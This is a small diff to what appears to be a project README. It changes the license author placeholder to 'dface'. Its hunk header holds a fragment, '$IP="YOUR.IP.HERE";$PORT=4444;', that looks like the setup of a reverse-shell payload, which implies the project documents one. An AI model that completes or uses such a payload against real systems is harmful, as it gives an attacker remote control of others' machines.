@@ -137,7 +137,7 @@ $IP=\"YOUR.IP.HERE\";$PORT=4444;
 ---
 
 ##  **License**
-[MIT License](LICENSE) - © 2026 [Your Name]
+[MIT License](LICENSE) - © 2026 dface
 
 ```
 Permission is hereby granted, free of charge, to any person
